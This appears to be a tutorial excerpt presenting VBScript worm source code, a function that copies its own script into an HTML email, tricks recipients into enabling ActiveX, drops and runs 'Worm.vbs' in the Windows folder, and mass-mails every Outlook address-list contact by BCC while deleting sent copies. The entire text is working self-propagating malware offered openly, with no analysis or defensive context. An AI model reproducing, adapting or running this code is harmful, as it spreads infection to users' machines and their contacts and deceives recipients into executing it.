This function will send a message to all the people in the address list with the worm
in the message body.
_______________________________________________________________________
¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯
Function OutlookBody()
On Error Resume Next
Set fso = CreateObject("scripting.filesystemobject")
Set Outlook = CreateObject("Outlook.Application")
If Outlook = "Outlook" Then
Set Myself = fso.opentextfile(wscript.scriptfullname, 1)
I = 1
Do While Myself.atendofstream = False
MyLine = Myself.readline
Code = Code & Chr(34) & " & vbcrlf & " & Chr(34) & Replace(MyLine, Chr(34), Chr(34) & "&chr(34)&" & Chr(34))
Loop
Myself.Close
htm = "<" & "HTML><" & "HEAD><" & "META content=" & Chr(34) & " & chr(34) & " & Chr(34) & "text/html; charset=iso-8859-1" & Chr(34) & " http-equiv=Content-Type><" & "META content=" & Chr(34) & "MSHTML 5.00.2314.1000" & Chr(34) & " name=GENERATOR><" & "STYLE></" & "STYLE></" & "HEAD><" & "BODY bgColor=#ffffff><" & "SCRIPT language=vbscript>"
htm = htm & vbCrLf & "On Error Resume Next"
htm = htm & vbCrLf & "Set fso = CreateObject(" & Chr(34) & "scripting.filesystemobject" & Chr(34) & ")"
htm = htm & vbCrLf & "If Err.Number <> 0 Then"
htm = htm & vbCrLf & "document.write " & Chr(34) & "<font face='verdana' color=#ff0000 size='2'>You need ActiveX enabled if you want to see this e-mail.<br>Please open this message again and click accept ActiveX<br>Microsoft Outlook</font>" & Chr(34) & ""
htm = htm & vbCrLf & "Else"
htm = htm & vbCrLf & "Set vbs = fso.createtextfile(fso.getspecialfolder(0) & " & Chr(34) & "\Worm.vbs" & Chr(34) & ", True)"
htm = htm & vbCrLf & "vbs.write  " & Chr(34) & Code & Chr(34)
htm = htm & vbCrLf & "vbs.Close"
htm = htm & vbCrLf & "Set ws = CreateObject(" & Chr(34) & "wscript.shell" & Chr(34) & ")"
htm = htm & vbCrLf & "ws.run fso.getspecialfolder(0) & " & Chr(34) & "\wscript.exe " & Chr(34) & " & fso.getspecialfolder(0) & " & Chr(34) & "\Worm.vbs %" & Chr(34) & ""
htm2 = htm2 & vbCrLf & "document.write " & Chr(34) & "This message has permanent errors.<br>Sorry<br>" & Chr(34) & ""
htm2 = htm2 & vbCrLf & "End If"
htm2 = htm2 & vbCrLf & "<" & "/SCRIPT></" & "body></" & "html>"
HtmlBody = htm & htm2
Set mapi = Outlook.GetNameSpace("MAPI")
Set Mapiadd=mapi.AddressLists
For Each Addresslist In Mapiadd
If Addresslist.AddressEntries.Count <> 0 Then
AddCount = Addresslist.AddressEntries.Count
Set Msg = Outlook.CreateItem(0)
Msg.Subject = "Rv: 4You"
Msg.HtmlBody = HtmlBody
Msg.DeleteAfterSubmit = True
For II = 1 To AddCount
Set Addentry = Addresslist.AddressEntries(II)
If AddCount = 1 Then
Msg.BCC = Addentry.Address
Else
Msg.BCC = Msg.BCC & "; " & Addentry.Address
End If
Next
Msg.send
End If
Next
Outlook.Quit
End If
End Function
_______________________________________________________________________
¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯